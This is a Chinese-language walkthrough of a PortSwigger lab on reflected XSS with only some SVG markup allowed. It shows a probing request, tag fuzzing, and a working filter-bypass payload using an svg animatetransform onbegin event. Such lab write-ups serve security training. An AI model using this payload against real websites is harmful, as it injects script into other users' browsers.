# 实验：允许部分 SVG 标记的反射型 XSS

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

本实验包含一个简单的反射型 XSS 漏洞。该网站阻止了常见的标签，但遗漏了一些 SVG 标签和事件。

为了解决本实验，请执行一个跨站脚本攻击，调用 `alert()` 函数。

## 步骤

探测
- 使用搜索功能
    ```http
    GET /?search=%3Csvg%3E HTTP/1.1
    ```

    - 响应
        ```html
        <h1>0 search results for '<svg>'</h1>
        ```

- 使用 burp xss 速查表爆破得到可用标签
    - `svg`
    - `animatetransform`


测试
- 遍历 `svg animatetransform` burp xss 速查表基础载荷
    - 其中 `onbegin` 事件并未被阻止
        `<svg><animatetransform onbegin=alert(1) attributeName=transform>`
